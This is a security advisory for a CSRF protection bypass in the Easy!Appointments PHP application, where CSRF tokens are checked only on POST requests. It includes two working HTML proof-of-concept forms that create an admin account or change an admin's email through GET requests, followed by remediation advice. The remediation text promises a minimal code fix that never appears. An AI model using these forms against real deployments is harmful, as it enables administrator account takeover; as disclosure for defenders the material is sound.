# [H] alextselegidis/easyappointments is Vulnerable to CSRF Protection Bypass

## Summary
Severity: High
Advisory: GHSA-54v4-4685-vwrj
CVE: CVE-2026-23622
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-15
Source: https://github.com/advisories/GHSA-54v4-4685-vwrj
Type: github-advisory

## Affected
- Packagist: `alextselegidis/easyappointments` — affected >=0

## Details
### Summary
`application/core/EA_Security.php::csrf_verify()` only enforces CSRF for POST requests and returns early for non-POST methods. Several application endpoints perform state-changing operations while accepting parameters from GET (or $_REQUEST), so an attacker can perform CSRF by forcing a victim's browser to issue a crafted GET request. Impact: creation of admin accounts, modification of admin email/password, and full admin account takeover

### Details

in https://github.com/alextselegidis/easyappointments/blob/41c9b93a5a2c185a914f204412324d8980943fd5/application/core/EA_Security.php#L52

* **Repository / tested commit:** `alextselegidis/easyappointments` — commit `41c9b93a5a2c185a914f204412324d8980943fd5`.
* **Vulnerable file & function:** `application/core/EA_Security.php::csrf_verify()` — around line 52. Link: `.../application/core/EA_Security.php#L52`.
* **Root cause:** The function early-returns when the request is not `POST`:

```php
// vulnerable snippet
if (strtoupper($_SERVER['REQUEST_METHOD']) !== 'POST') {
    return $this->csrf_set_cookie();
}
```

Because of this, non-POST requests (GET/PUT/DELETE/etc.) never reach token validation. When application controllers accept state-changing parameters via `GET` or `$_REQUEST`, these requests bypass CSRF checks entirely and the application executes the state change.

* **Examples of vulnerable endpoints (observed during testing):**

  * `index.php/admins/store` — create admin (accepts fields via GET)
  * `index.php/admins/update` — modify admin (accepts fields via GET)
  * `index.php/account/save` — modify account/password (accepts fields via GET)

* **Why this is critical:** An attacker can host a simple page that issues requests (e.g., `<form method="GET" action="...">` or an auto-submitting form). If an authenticated admin visits that page, the attacker can create an admin account, change admin email, or change password—enabling account takeover and full compromise of the application instance.


### PoC
I will attach video proof showing how I add an admin via CSRF. Below are reproducible PoC artifacts and steps to reproduce locally 

https://github.com/user-attachments/assets/3fea1034-c479-43d9-9c40-86f8ba0b33c1

**Browser PoC (HTML)**
Save one of the HTML files (example `csrf_add_admin_account.html`) on an attacker server and visit it with a browser where the admin is logged into Easy!Appointments:

```html
<html>
<body>
<form method="GET" action="http://localhost:80/easyappointments/index.php/admins/store">
  <input type="hidden" name="admin[first_name]" value="admin_add_by_csrf">
  <input type="hidden" name="admin[last_name]" value="poc">
  <input type="hidden" name="admin[email]" value="poc@gmail.com">
  <input type="hidden" name="admin[mobile_number]" value="">
  <input type="hidden" name="admin[phone_number]" value="0923092">
  <input type="hidden" name="admin[address]" value="">
  <input type="hidden" name="admin[city]" value="">
  <input type="hidden" name="admin[state]" value="">
  <input type="hidden" name="admin[zip_code]" value="">
  <input type="hidden" name="admin[notes]" value="">
  <input type="hidden" name="admin[language]" value="english">
  <input type="hidden" name="admin[timezone]" value="UTC">
  <input type="hidden" name="admin[settings][username]" value="admincsrf1">
  <input type="hidden" name="admin[settings][notifications]" value="1">
  <input type="hidden" name="admin[settings][calendar_view]" value="table">
  <input type="hidden" name="admin[settings][password]" value="changeme">
  <input type="submit" value="Submit request">
</form>
</body>
</html>
```

another example for another endpoint

`csrf_change_admin_email.html`

```html
<html>
<body>
<form method="GET" action="http://localhost:80/easyappointments/index.php/admins/update">
  <input type="hidden" name="admin[first_name]" value="test">
  <input type="hidden" name="admin[last_name]" value="cve">
  <input type="hidden" name="admin[email]" value="test1@cve.com">
  <input type="hidden" name="admin[mobile_number]" value="">
  <input type="hidden" name="admin[phone_number]" value="0101900">
  <input type="hidden" name="admin[address]" value="">
  <input type="hidden" name="admin[city]" value="">
  <input type="hidden" name="admin[state]" value="">
  <input type="hidden" name="admin[zip_code]" value="">
  <input type="hidden" name="admin[notes]" value="">
  <input type="hidden" name="admin[language]" value="english">
  <input type="hidden" name="admin[timezone]" value="UTC">
  <input type="hidden" name="admin[settings][username]" value="testn">
  <input type="hidden" name="admin[settings][notifications]" value="1">
  <input type="hidden" name="admin[settings][calendar_view]" value="default">
  <input type="hidden" name="admin[id]" value="1">
  <input type="submit" value="Submit request">
</form>
</body>
</html>
```

### Suggested remediation (recommended)

Provide two practical remediation paths mmediate and long-term:

**Immediate (urgent, low-effort):** Enforce CSRF checks for all  methods  and do not skip validation for non-POST. Minimal core fix:

This closes the common bypass route while keeping read-only GET behavior intact.

**Stricter immediate option (no-bypass):** Require a valid CSRF token for **all** methods (including GET) unless the URI is explicitly whitelisted in `csrf_exclude_uris`. This prevents GET-based bypass even if controllers remain unchanged but may require updates to legitimate GET consumers.

**Long-term (recommended, correct fix):**

1. **Controller hardening:** Update controllers so all state-changing actions accept only the proper HTTP method (POST/PUT/DELETE) .
2. **Require re-authentication or confirmation** for critical operations (email/password changes).
3. **Set cookie flags**: `SameSite`, `Secure`, and `HttpOnly` as appropriate.


### Impact

* **Type:** Cross-Site Request Forgery (CSRF) allowing account takeover / privilege escalation.
* **Who is impacted:** Any deployment of Easy!Appointments using the vulnerable code where administrative or sensitive endpoints accept GET or use `$_REQUEST` (what i found is almost every endpoint work with GET and POST). Logged-in administrator users are at greatest risk.
* **Consequences:** An attacker can create administrative accounts, change administrator emails/passwords (leading to password reset abuse), and fully compromise application instances and data.

## References
- https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-54v4-4685-vwrj
- https://nvd.nist.gov/vuln/detail/CVE-2026-23622
- https://github.com/alextselegidis/easyappointments
- https://github.com/alextselegidis/easyappointments/blob/41c9b93a5a2c185a914f204412324d8980943fd5/application/core/EA_Security.php#L52
